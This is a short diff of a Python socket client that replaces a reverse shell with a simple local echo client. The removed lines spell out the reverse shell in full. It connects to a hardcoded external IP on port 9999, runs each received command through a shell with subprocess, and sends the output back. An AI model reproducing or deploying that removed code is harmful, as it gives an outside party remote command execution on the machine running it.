@@ -1,23 +1,13 @@
+# Client that sends a message to the server and receives a response
+
 import socket
-import os
-import subprocess
 
-s = socket.socket()
-host = '104.236.209.167'
-port = 9999
+HOST = "127.0.0.1"  # The server's hostname or IP address
+PORT = 65432  # The port used by the server
 
-s.connect((host, port))
-
-while True:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    s.sendall(b"Hello, world")
     data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
-
-        print(output_str)
+print(f"Received {data!r}")
